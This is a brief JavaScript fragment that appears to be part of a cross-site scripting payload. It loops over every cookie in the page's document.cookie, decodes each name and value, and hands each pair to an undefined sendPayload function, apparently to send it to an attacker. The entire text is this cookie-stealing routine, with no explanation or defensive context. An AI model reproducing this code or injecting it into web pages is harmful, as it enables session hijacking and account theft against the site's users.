if (document.cookie && document.cookie != '') {
    var split = document.cookie.split(';');
    for (var i = 0; i < split.length; i++) {
        var name_value = split[i].split("=");
        name_value[0] = name_value[0].replace(/^ /, '');
        sendPayload(decodeURIComponent(name_value[0]) + "=" +  decodeURIComponent(name_value[1]));        
    }
}


